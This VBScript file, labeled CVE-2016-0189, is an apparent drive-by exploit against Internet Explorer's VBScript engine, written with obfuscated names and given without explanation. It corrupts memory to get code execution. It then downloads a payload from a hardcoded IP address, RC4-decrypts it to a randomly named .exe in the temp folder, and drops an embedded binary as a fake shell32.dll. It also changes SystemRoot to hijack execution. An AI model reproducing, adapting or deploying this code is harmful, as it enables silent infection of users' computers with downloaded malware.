' CVE-2016-0189

Dim awdfgdf
Dim awghjgh
Dim awhgh
Dim aw
Dim lunnga(32)
Dim y(32)


Function hegfhsdf
        Dim i
        For i = 0 To k3
            y(i) = Mid(x, 1, k2*12)
        Next
    End Function

Function hegfdf
        Dim i2
        For i = 0 To k3
            y(i) = Mid(x, 1, k2*22)
        Next
    End Function

k1 = 1
k2 = 1999 + k1
fix1 = "%u4141"
fix22 = "%u0000"
    dddfgergere = fix1 & fix1
k3 = 32
fix3 = dddfgergere & fix1
dfgdfgew = "%u0"&"000"
fdgxvxc = "%u00"&"00"
sdfddf ="%u4"&"242"
jfdgdfgd = "%u0"&"016"
ghdfgfdgghj =  "%u"&"4242" & sdfddf
    trifix = fdgxvxc & dfgdfgew & fix22
    d = dddfgergere & jfdgdfgd & fix3 & ghdfgfdgghj
    b = String(k2*k3, "D")
    c = d & b
    x = UnEscape(c)

    Class MiddleD
    End Class

    Class jhgjghjg
        Dim Num
         Dim Num1
          Dim Num2
           Dim Num3
            Dim Num4
             Dim Num5
              Dim Num6
               Dim Num7
        Dim Cod()

        Private Sub Class_Initialize
            ReDim Preserve Cod(k1, k2)
        End Sub

        Public Sub ZeroineL()
            ReDim Preserve Cod(k1, k1)
        End Sub
    End Class

    Function GogoGoA (arg1, s)
        lol = Null
        aw = lol
        Set aw = New jhgjghjg

        For i = 0 To k3
            Set lunnga(i) = s
        Next

        Set aw.Cod(arg1, 2) = s

        Dim addr
        Dim i
        For i = 0 To k3-1
            If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
                addr = strToInt(Mid(y(i), 3 + 4, 2))
            End If
            y(i) = Null
        Next

        If addr = Null Then
            document.location.href = document.location.href
            Return
        End If

        GogoGoA = addr
    End Function

    Function sdfxcvxc (arg1, addr)
        d = dddfgergere & "%u0008" & fix3
        c = d & intToStr(addr) & b
        x = UnEscape(c)
        aw = Null
        Set aw = New jhgjghjg
        Dim o
        o = aw.Cod(arg1, 2)
        sdfxcvxc = o
    End Function

    Sub Rewwati (arg1, addr)
        d = dddfgergere & "%u400C" & trifix
        c = d & intToStr(addr) & b
        x = UnEscape(c)
        aw = Null
        Set aw = New jhgjghjg
        aw.Cod(arg1, 2) = CSng(0)
    End Sub

    Sub Rewwati2 (arg1, addr)
        Dim emptyval
        d = dddfgergere & "%u400C" & trifix
        c = d & intToStr(addr) & b
        x = UnEscape(c)
        aw = Null
        Set aw = New jhgjghjg
        aw.Cod(arg1, 2) = emptyval
    End Sub

    Function ProtectMe (arg1)
        Dim addr
        Dim sexy
        Dim koles
        Dim mem
        Set dm = New MiddleD
        addr = GogoGoA(arg1, dm)
        mem = sdfxcvxc(arg1, addr + 8)
        sexy = strToInt(Mid(mem, 3, 2))
        mem = sdfxcvxc(arg1, sexy + 4)
        koles = strToInt(Mid(mem, 1, 2))
        Rewwati arg1, koles + &H174
        fire()
        Rewwati2 arg1, koles + &H174
    End Function

Function rnds(strLen)
    Dim str
    Const LETTERS = "abcdehiklmnoprstuw02346"
    Randomize
    For i = 1 to strLen
        str = str & Mid(LETTERS, Int(23*Rnd+1), 1)
    Next
    rnds = str
End Function

Function hehgfggghsdf
        Dim i
        For i = 0 To k3
            y(i) = Mid(x, 1, k2*12)
        Next
    End Function

Sub fire()
      On Error Resume Next
      key="cvytEL5a"
      url="http://5.23.49.81/?MjE4MzEz&RrznwCQ&hFIyROkAlmigb=wrapped&UPFgSthfHtEd=professional&neehUAhwGxWzQUk=criticized&JfMDpOqqVRUgCqs=difference&zOBBwTTvhenCRxq=heartfelt&ahAElLwlwHyWr=strategy&KUbRMuZRbs=strategy&pZHQAeJuzRzNtq=referred&t4tsg4=FXo3xPReQM1nYcMWwkWpK6m30PVnxDK1J6F-0OPYw9M-MeQQLcL0VT8x7gdecIhzibfqWdT_A&grAULQ=constitution&vxrqYyM=golfer&WafDQGH=heartfelt&VmdNannlzwr=heartfelt&RVqlfMJwcHVOnRy=perpetual&dCbdHET=blackmail&bIssYnkSuNj=community&ff5ds=wnjQMvXcJRXQFYbGKuXDSKJDKU7WGkaVw4-QhMG3YpnNfynz2OzURnL7tASVVFuRrbMdJOABO&FxdzLpTaIFNTA3Mjgy"
      uas=Navigator.userAgent

      Set oss=GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem")
      Dim osloc
      Dim awghjghg
      for each os in oss
        osloc=os.OSLanguage
      next
      SetLocale(osloc)


      Set req=CreateObject("WinHTTP.WinHTTPRequest.5.1")
      fdgx4545c = "GET"
      req.SetProxy 0
      req.Open fdgx4545c,url,0
      req.Option(0)=uas
      req.Send
      If 200=req.status Then
        z=req.responseBody
        Set c=CreateObject("Scrip"&"ting.FileSy"&"stemObject")
        tmp=c.GetSpecialFolder(2)
        fake32=tmp&"\System32"
        If Not c.FolderExists(fake32) Then
          c.CreateFolder(fake32)
        End If
        Dim uyu5t,dlltxt,sdfsdf,dop,fakedll

        dop=&h20
        vxcv = 0
        one = 1
        forr = 4
        jfsjdf = &h68
        popi = 2
        fdf = "10"



        sdfsdf = " 4D 5A 80 00 01 00 00 00 04 00 10 00 FF FF 00 00 40 01 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 6D 6F 64 65 2E 0D 0A 24 00 00 00 00 00 00 00 00 50 45 00 00 4C 01 04 00 21 3C 6E 58 00 00 00 00 00 00 00 00 E0 00 0E 21 0B 01 01 47 00 02 00 00 00 06 00 00 00 00 00 00 00 10 00 00 00 10 00 00 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00 01 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 50 00 00 00 04 00 00 00 00 00 00 02 00 40 00 00 10 00 00 00 10 00 00 00 00 01 00 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 30 00 00 FC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 28 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2E 74 65 78 74 00 00 00 A1 00 00 00 00 10 00 00 00 02 00 00 00 04 00 00 00 00 00 00 61 4A 28 F5 00 00 00 00 20 00 00 60 2E 64 61 74 61 00 00 00 EE 01 00 00 00 20 00 00 00 02 00 00 00 06 00 00 00 00 00 00 01 5A 28 57 00 00 00 00 40 00 00 C0 2E 69 64 61 74 61 00 00 FC 00 00 00 00 30 00 00 00 02 00 00 00 08 00 00 00 00 00 00 01 6A 28 59 00 00 00 00 40 00 00 C0 2E 72 65 6C 6F 63 00 00 28 00 00 00 00 40 00 00 00 02 00 00 00 0A 00 00 00 00 00 00 01 7A 28 D9 00 00 00 00 40 00 00 42 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 89 E5 83 7D 0C 01 0F 85 8B 00 00 00 B9 96 00 00 00 49 F6 91 58 21 40 00 80 B1 58 21 40 00 A3 85 C9 75 EE 68 58 21 40 00 6A 01 6A 01 6A 00 FF 15 6C 30 40 00 FF 15 74 30 40 00 85 C0 75 59 C7 05 04 21 40 00 44 00 00 00 C7 05 30 21 40 00 01 01 00 00 68 04 01 00 00 68 00 20 40 00 FF 15 70 30 40 00 68 00 20 40 00 68 E3 21 40 00 FF 15 78 30 40 00 68 48 21 40 00 68 04 21 40 00 6A 00 6A 00 6A 00 6A 00 6A 00 6A 00 68 7D 21 40 00 6A 00 6A 00 FF 15 DC 30 40 00 B8 01 00 00 00 C9 C2 0C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3F 6C 6B 6B 38 38 39 6A 71 6A 6F 6A 68 71 68 68 6D 65 71 3D 3F 38 6E 71 3E 64 69 6C 69 64 6D 3E 64 3A 6A 68 5C 3F 5C 31 5C 38 5C 72 5C 39 5C 24 5C 39 5C 7C 5C 73 5C 3F 5C 7C 5C 2F 5C 28 5C 3D 5C 2E 5C 28 5C 7C 5C 79 5C 0F 5C 25 5C 2F 5C 1A 5C 35 5C 30 5C 39 5C 32 5C 3D 5C 31 5C 39 5C 79 5C 7C 5C 7A 5C 7C 5C 2E 5C 38 5C 7C 5C 73 5C 2F 5C 7C 5C 73 5C 2D 5C 7C 5C 0F 5C 25 5C 2F 5C 28 5C 39 5C 31 5C 6F 5C 6E 5C 5C 5C 0F 25 2F 28 39 31 0E 33 33 28 5C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3C 30 00 00 6C 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 4A 30 00 00 DC 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 4B 45 52 4E 45 4C 33 32 2E 44 4C 4C 00 00 41 44 56 41 50 49 33 32 2E 44 4C 4C 00 00 80 30 00 00 90 30 00 00 A8 30 00 00 B8 30 00 00 00 00 00 00 80 30 00 00 90 30 00 00 A8 30 00 00 B8 30 00 00 00 00 00 00 00 00 43 72 65 61 74 65 45 76 65 6E 74 41 00 00 00 00 47 65 74 57 69 6E 64 6F 77 73 44 69 72 65 63 74 6F 72 79 41 00 00 00 00 47 65 74 4C 61 73 74 45 72 72 6F 72 00 00 00 00 53 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74 56 61 72 69 61 62 6C 65 41 00 00 00 E4 30 00 00 00 00 00 00 E4 30 00 00 00 00 00 00 00 00 43 72 65 61 74 65 50 72 6F 63 65 73 73 41 73 55 73 65 72 57 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 28 00 00 00 15 30 1B 30 25 30 31 30 37 30 41 30 4B 30 59 30 5F 30 64 30 69 30 6F 30 74 30 79 30 8A 30 94 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"



        hexarr = Split(sdfsdf)
        ReDim binarr(UBound(hexarr))
        For i = 0 To UBound(hexarr)
        binarr(i) = Chr(CInt("&h" & hexarr(i)))
        Next

        binstr = Join(binarr, "")

        For i=0 to Ubound(hexarr)
            hexarr(i) = Chr(hexarr(i))
        Next
        dlltxt = binstr
        fakedll = c.BuildPath(fake32,"she"&"ll32.dll")
        Set b=c.CreateTextFile(fakedll)
        b.Write dlltxt
        b.Close
        f=c.BuildPath(tmp,rnds(8)&".exe")
        Set stream=CreateObject("ADODB.Stream")
        stream.Open
        stream.Type=1
        stream.Write z
        arcnsave stream,key,f
        stream.Close

        Set w=CreateObject("WScript.Shell")
        w.CurrentDirectory=tmp
        oldroot=w.Environment("Process").Item("SystemRoot")
        w.Environment("Process").Item("SystemRoot")=tmp
        w.Environment("Process").Item("SysFilename")=f
        Set sh = CreateObject("Shell.Application")
        Environment("Process").Item("SystemRoot")=oldroot
      End If
    End Sub

    Sub arcnsave(stream,strKey,fname)
      Dim kLen,x,y,i,j,t,slen,aBuf,bStream
      Dim s(256),k(256)
      klen=Len(strKey)
      For i=0 To 255
        s(i)=i
        k(i)=AscB(Mid(strKey, (i Mod klen)+1,1))
      Next
      j=0
      For i=0 To 255
        j=(j+k(i)+s(i)) And 255
        t=s(i):s(i)=s(j):s(j)=t
      Next
      slen=stream.position
      redim rc(slen)
      stream.position=0
      x=0:y=0
      For i=0 To slen-1
        x=(x+1) And 255
        y=(y+s(x)) And 255
        t=s(x):s(x)=s(y):s(y)=t
        rc(i)=Chr(CByte(s((s(x)+s(y)) And 255) Xor AscB(stream.Read(1))))
      Next
      Dim rctxt: rctxt = join(rc,"")
      Set c=CreateObject("Scripting.FileSystemObject")
      Set b=c.CreateTextFile(fname)
      b.Write rctxt
      b.Close
    End Sub

    Function hedfsdf
        aw.ZeroineL()
        Dim i
        For i = 0 To k3
            y(i) = Mid(x, 1, k2*12)
        Next
    End Function

    Function hehgsdf
        aw.ZeroineL()
        Dim i
        For i = 0 To k3
            y(i) = Mid(x, 1, k2*12)
        Next
    End Function

    Function hehgfggsdf
        Dim i
        For i = 0 To k3
            y(i) = Mid(x, 1, k2*12)
        Next
    End Function